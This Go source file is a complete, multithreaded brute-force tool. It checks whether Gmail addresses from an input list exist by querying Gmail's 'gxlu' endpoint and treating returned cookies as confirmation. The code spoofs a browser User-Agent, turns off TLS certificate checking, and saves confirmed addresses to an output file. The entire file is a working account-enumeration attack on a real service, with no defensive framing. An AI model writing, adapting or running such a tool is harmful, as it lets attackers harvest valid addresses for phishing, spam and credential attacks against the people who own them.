package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
	"log"
)

type Result struct {
	Found   bool
	Address string
}

var (
	inputFile  string
	outputFile string
	stdin      bool
	validChars bool
	threads    int
	client     *http.Client
	headers    map[string]string
)

func init() {
	flag.StringVar(&inputFile, "i", "", "List of accounts to test")
	flag.StringVar(&outputFile, "o", "", "Output file (default: Stdout)")
	flag.BoolVar(&stdin, "stdin", false, "Read accounts from stdin")
	flag.BoolVar(&validChars, "r", false, "Remove gmail address' invalid chars")
	flag.IntVar(&threads, "t", 10, "Number of threads")
	flag.Parse()

	if inputFile == "" && !stdin {
		flag.Usage()
		os.Exit(1)
	}

	client = &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}).DialContext,
			// MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			DisableKeepAlives:     true,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		},
	}

	headers = map[string]string{
		"User-Agent":      `Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0`,
		"Accept-Language": `en-US,en;q=0.5`,
	}
}

// TestAddress checks if a given address is valid using the glitch described here: https://blog.0day.rocks/abusing-gmail-to-get-previously-unlisted-e-mail-addresses-41544b62b2
func TestAddress(addr string, resChan chan<- Result) {
	URL := fmt.Sprintf("https://mail.google.com/mail/gxlu?email=%s", url.QueryEscape(addr))
	req, err := http.NewRequest(http.MethodGet, URL, nil)
	if err != nil {
		return
	}

	// Add headers
	for key, val := range headers {
		req.Header.Set(key, val)
	}

	// Make request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()

	found := len(resp.Cookies()) > 0
	resChan <- Result{found, addr}
}

func main() {

	addrChan := make(chan string, threads)
	resultsChan := make(chan Result)

	// Group to wait for all threads (routines) to finish
	threadsG := new(sync.WaitGroup)

	var input *os.File
	if stdin {
		input = os.Stdin
		inputFile = "stdin"
	} else {
		f, err := os.Open(inputFile)
		if err != nil {
			fmt.Printf("[!] Error opening file '%s'\n", inputFile)
			return
		}
		input = f
		defer f.Close()
	}

	var out *os.File 
	var err error
	if strings.Compare(outputFile, "") != 0 {
		out, err = os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatalln("Failed to open output file")
		}	
	}else{
		out = os.Stdout
	}
	defer out.Close()
	// TODO: Put some fancy ascii art here??
	fmt.Println("--- Starting bruteforce --")
	fmt.Printf("| Input:   %s\n", inputFile)
	fmt.Printf("| Threads: %d\n\n", threads)

	// Start all threads (routines)
	for i := 0; i < threads; i++ {
		go func() {
			for addr := range addrChan {
				if addr == "" {
					break
				}

				if validChars {
					addr = RemoveInvalidChars(addr)
				}

				TestAddress(addr, resultsChan)
			}
			threadsG.Done()
		}()
		threadsG.Add(1)
	}

	scanner := bufio.NewScanner(input)
	scanner.Split(bufio.ScanLines)

	done := make(chan bool)
	go func() {
		for scanner.Scan() {
			addr := strings.TrimSpace(scanner.Text())
			// Skip comments and empty lines
			if !strings.HasPrefix(addr, "#") && addr != "" {
				addrChan <- addr
			}
		}

		close(addrChan)
		threadsG.Wait()
		close(resultsChan)
		done <- true
	}()

	tested, found := 0, 0
	for result := range resultsChan {
		tested++
		if result.Found {
			found++
			if out == os.Stdout {
				// 'Flush' stdout
				fmt.Printf("%100s\r", "")
			}
			if _, err := out.WriteString(result.Address + "\n"); err != nil {
				log.Fatalf("WriteString: %v\n", err)
			}
		}
		fmt.Printf("[*] Tested: %d, Found: %d\r", tested, found)	
	}
	fmt.Printf("[*] Tested: %d, Found: %d\n", tested, found)

}
